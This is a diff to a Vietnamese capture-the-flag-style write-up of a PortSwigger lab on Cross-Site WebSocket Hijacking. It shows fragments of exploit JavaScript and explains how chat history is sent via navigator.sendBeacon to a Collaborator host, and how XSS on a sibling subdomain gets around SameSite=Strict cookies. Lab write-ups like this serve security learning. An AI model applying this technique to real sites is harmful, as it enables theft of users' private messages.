@@ -1,6 +1,6 @@
 ![image](https://github.com/user-attachments/assets/e58a53ff-142e-43d1-91c1-47b32feafdcd)
 
-ở challenge này thì chúng ta phải khai thác thông qua `Cross-site WebSocket hijacking`.
+Ở challenge này thì chúng ta phải khai thác thông qua `Cross-site WebSocket hijacking`.
 
 Cross-Site WebSocket Hijacking (CSWSH) là một kỹ thuật tấn công bảo mật khai thác cách ứng dụng xử lý các kết nối WebSocket để đánh cắp hoặc thao tác dữ liệu nhạy cảm.
 
@@ -38,7 +38,7 @@ _Khởi tạo WebSocket:_
 var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
 ```
 
-Lệnh này tạo một kết nối WebSocket từ client đến server (URL chỉ định đến endpoint /chat của ứng dụng mục tiêu).
+Lệnh này tạo một kết nối WebSocket từ client đến server (URL chỉ định đến `endpoint /chat` của ứng dụng mục tiêu).
 
 _Sự kiện onopen:_
 
@@ -48,7 +48,7 @@ ws.onopen = function() {
 };
 ```
 
-Khi kết nối WebSocket được mở thành công, lệnh ws.send("READY"); sẽ gửi thông báo "READY" đến server. Server sẽ phản hồi với dữ liệu chat history hoặc nội dung đã lưu (ví dụ: lịch sử tin nhắn).
+Khi kết nối WebSocket được mở thành công, lệnh `ws.send("READY");` sẽ gửi thông báo "READY" đến server. Server sẽ phản hồi với dữ liệu chat history hoặc nội dung đã lưu (ví dụ: lịch sử tin nhắn).
 
 _Sự kiện onmessage:_
 
@@ -58,9 +58,9 @@ ws.onmessage = function(event) {
 };
 ```
 
-Khi server gửi phản hồi qua WebSocket, phản hồi đó sẽ kích hoạt onmessage. Tham số event.data chứa nội dung được server gửi về, ở đây là chat history.
+Khi server gửi phản hồi qua WebSocket, phản hồi đó sẽ kích hoạt onmessage. Tham số `event.data` chứa nội dung được server gửi về, ở đây là `chat history`.
 
-navigator.sendBeacon gửi dữ liệu đến một URL khác (ở đây là https://YOUR-COLLABORATOR-PAYLOAD.oastify.com). Phương thức này đảm bảo dữ liệu sẽ được gửi đi ngay cả khi trang web bị đóng đột ngột.
+`navigator.sendBeacon` gửi dữ liệu đến một URL khác (ở đây là `https://YOUR-COLLABORATOR-PAYLOAD.oastify.com`). Phương thức này đảm bảo dữ liệu sẽ được gửi đi ngay cả khi trang web bị đóng đột ngột.
 
 ![image](https://github.com/user-attachments/assets/64980cef-cb05-46fd-9e62-73f6a1ebbcaa)
 
@@ -80,7 +80,7 @@ Request nó không có gửi cookie đi do có `samesite: strict`.
 
 ![image](https://github.com/user-attachments/assets/c2a04818-50fe-490d-bc71-9da17b7c0642)
 
-Sau khi đi hết các ngóc ngách của challenge này thì tôi phát hiện ra tại `/resources/images/shop.svg` có lộ 1 subdomain thông qua `Access-Control-Allow-Origin` (1 cơ chế bảo mật thuộc CORS)
+Sau khi đi hết các ngóc ngách của challenge này thì tôi phát hiện ra tại `/resources/images/shop.svg` có lộ 1 subdomain thông qua `Access-Control-Allow-Origin` (1 cơ chế bảo mật thuộc `CORS`)
 
 ![image](https://github.com/user-attachments/assets/06f118d3-897c-4446-9c63-8f36b31b942b)
 
@@ -96,7 +96,7 @@ Nó bị html injection và khi tôi test với tag script thì nó cũng bị x
 
 vậy giờ ta hãy lợi dụng xss ở trang này để thực thi code js ở trang kia. 
 
-Tiến hành tạo 1 payload GET như các challenge trước với mục đích là để lợi dụng các same origin để thực thi payload (bypass samesite: strict).
+Tiến hành tạo 1 payload GET như các challenge trước với mục đích là để lợi dụng các same origin để thực thi payload (`bypass samesite: strict`).
 
 ```
 <script>
@@ -115,6 +115,10 @@ Tiến hành gửi cho con bot.
 ![image](https://github.com/user-attachments/assets/3b2a29e4-b09d-4ef6-9c3f-772cd1f4f22e)
 
 Vào collaborator thì ta đã lấy được thành công thông tin của đoạn chat này
+
+![image](https://github.com/user-attachments/assets/a557de53-b1b6-4227-b152-e595d501087e)
+
+Thành công
 
 ## REFERENCES
 [1]. https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
